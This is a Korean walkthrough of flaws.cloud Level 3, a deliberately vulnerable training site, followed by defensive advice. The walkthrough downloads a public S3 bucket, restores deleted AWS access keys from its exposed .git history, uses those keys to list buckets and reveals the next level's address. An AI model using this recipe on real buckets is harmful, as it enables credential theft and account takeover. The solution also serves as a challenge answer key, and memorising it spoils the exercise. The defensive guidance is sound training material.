# Level 3 — `.git` 디렉터리에서 AWS 키 복원

> **URL**: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/<br>
> **핵심 기술**: S3 공개 버킷 / Git 히스토리 / 장기 access key<br>
> **난이도**: ⭐⭐<br>
> **본인 AWS 계정 필요**: ❌ (획득한 `flaws` 키 사용)

## 🎯 목표

이 레벨의 서버에는 누군가 **`.git` 디렉터리까지 통째로 올려 둔** 웹사이트가 있다. 과거 커밋에는 **AWS 자격증명** 이 남아 있고, 이 키로 다음 레벨 버킷을 찾는다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 버킷에는 웹사이트가 호스팅돼 있습니다. 그런데 이 사이트의 **어딘가에 민감한 정보가 남아 있는 흔적**이 있습니다.

</details>

<details>
<summary><b>Hint 2</b></summary>

> 개발자가 git 저장소를 통째로 배포했다면 어떻게 될까요?

</details>

<details>
<summary><b>Hint 3</b></summary>

> 버킷을 리스팅해서 `.git/` 아래 파일들을 찾아보세요. 과거 커밋을 복원하면 무엇이 나옵니까?

</details>

## 📚 사전 지식

- 웹 루트에 `.git/` 이 공개되면 `git clone` 으로 전체 저장소를 복원 가능.
- `git log` / `git show` / `git checkout <hash>` 로 **지운 커밋**의 내용도 되살릴 수 있다. "커밋 이력에서 파일만 `rm` 해도 히스토리에는 남는다" 는 고전적 함정.
- 장기 access key 는 `AKIA[0-9A-Z]{16}` 형태. `aws configure --profile <이름>` 으로 쉽게 등록.

## 🔍 정찰

버킷 리스팅(이번에도 익명 공개):
```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ \
  --no-sign-request --region us-west-2
```
결과의 일부:
```
                           PRE .git/
2017-02-27 10:14:33         45 authenticated_users.png
2017-02-27 10:14:34       1433 hint1.html
...
2017-02-27 10:14:36       1051 index.html
2017-02-27 10:14:36         26 robots.txt
```
`.git/` 디렉터리가 보인다.

## 🧨 취약점 원리

두 단계가 결합된 실수다.
1. **공개 버킷**에 저장소 전체가 업로드됨(`.git/` 포함). 이 자체로 웹 프레임워크 소스·설정이 모두 공개된다.
2. 과거 커밋에 **장기 자격증명**이 포함됐고, 나중에 "삭제" 커밋만 올렸을 뿐 **히스토리는 남아 있음**. `git log` 만 봐도 바로 찾는다.

## 🛠 풀이

### 1. 버킷 전체 내려받기
```bash
mkdir /tmp/level3 && cd /tmp/level3
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . \
  --no-sign-request --region us-west-2
```

### 2. git 히스토리 확인
```bash
git log --oneline
# b64c8dc Oops, accidentally added something I shouldn't have
# f52ec03 first commit
```
"실수로 뭔가 올렸다" 라는 **자백성 커밋 메시지** 가 보인다.

### 3. 이전 커밋으로 되돌려서 무슨 파일이 있었는지 보기
```bash
git show f52ec03 --stat
# access_keys.txt | 2 ++
# ...
git show f52ec03:access_keys.txt
```
예상 출력:
```
access_key AKIAJ3xx...redacted...IJKT7SA
secret_access_key OdNa7xx...redacted...P83Jys
```

### 4. `flaws` 프로파일로 등록 후 다음 버킷 찾기
```bash
aws configure --profile flaws
# AWS Access Key ID: AKIAJ3xx...redacted...IJKT7SA
# AWS Secret Access Key: OdNa7xx...redacted...P83Jys
# Default region name: us-west-2
# Default output format: json

aws sts get-caller-identity --profile flaws
# {
#   "UserId": "AIDA...",  # 값은 계정/시점에 따라 달라짐
#   "Account": "975426262029",
#   "Arn": "arn:aws:iam::975426262029:user/backup"
# }

aws s3 ls --profile flaws
```
출력 중에 `level4-1156739cfb264ced6de514971a4bef68.flaws.cloud` 가 보인다 — 다음 레벨.

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 다음 레벨: **http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/**
- 교훈: 커밋 하나라도 자격증명을 포함하면 **영원히 누출**된 것으로 간주하고 즉시 **회전(rotate)** 해야 한다. 히스토리 삭제는 신뢰할 수 없다.

</details>

## 🌍 실제 세계 사례

- 2016 년 **Uber** 엔지니어가 GitHub 에 올린 비공개 스니펫에 AWS 키 포함 → 5,700만 건 정보 유출.
- 2018 년 **Scotiabank** — GitHub 공개 저장소 여러 건에서 내부 시스템 자격증명 노출.
- GitHub 는 2019 년부터 **secret scanning** 을 무료 제공하지만, 자체 호스팅이나 공개 S3 등 **다른 배포 채널**이 취약점의 진짜 통로가 된다.

## 🛡 방어 대책

### ① 빌드 산출물만 배포 — 소스/`.git` 은 절대 배포 금지
CI 파이프라인에서 `rsync --exclude='.git'` 등으로 루트에 숨은 디렉터리가 올라가지 않게 한다. 정적 사이트면 `public/` 만 배포.

### ② `.gitignore` · pre-commit 훅
```gitignore
*.pem
*.key
.env
access_keys.txt
**/credentials*
```
`git-secrets` (AWS Labs), `detect-secrets`, `gitleaks` 를 pre-commit 훅 / CI 에 연결.

### ③ GitHub/CodeCommit 의 시크릿 스캐닝 활성화
- GitHub: Settings → Security → **Secret scanning**
- 스캐너가 유효한 AWS 키를 발견하면 AWS 가 자동으로 **AWSCompromisedKeyQuarantineV2** 정책을 첨부해 대부분의 권한을 차단.

### ④ 키가 유출된 것을 발견하면
```bash
# 즉시 비활성화
aws iam update-access-key --user-name backup \
  --access-key-id AKIA... --status Inactive
# 새 키 발급 후 삭제
aws iam delete-access-key --user-name backup --access-key-id AKIA...
```
히스토리 정리는 `git filter-repo` / BFG 를 쓰되, **"삭제는 원복 수단이 아니다"** 를 원칙으로 기억.

### ⑤ IAM 사용자 대신 IAM 역할 사용
CI/CD 는 **OIDC Federation** (예: GitHub Actions → AWS 역할)으로 장기 키를 아예 없앤다. 유출할 만한 key 가 존재하지 않는 상태가 최선.

## ✅ 체크리스트

- [ ] `aws s3 sync` 로 버킷 전체 복제 재현
- [ ] `git log` 로 "Oops..." 커밋 발견
- [ ] 이전 커밋에서 `access_keys.txt` 복원
- [ ] `aws configure --profile flaws` 후 `get-caller-identity` 성공
- [ ] 본인 환경에서 pre-commit 훅(gitleaks 등) 도입

## ⏭ 다음

[← Level 2](level-02.md) · [Level 4 →](level-04.md)
